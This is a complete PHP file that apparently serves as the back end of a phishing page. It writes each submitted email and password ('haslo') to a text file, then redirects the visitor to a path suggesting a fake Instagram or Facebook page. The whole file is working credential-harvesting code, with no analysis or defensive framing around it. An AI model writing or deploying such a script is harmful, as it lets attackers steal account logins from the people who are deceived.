<?php
file_put_contents("usernamesf.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['haslo'] .
"\n", FILE_APPEND);
header('Location: /ig/fb/index.html');
exit();
?>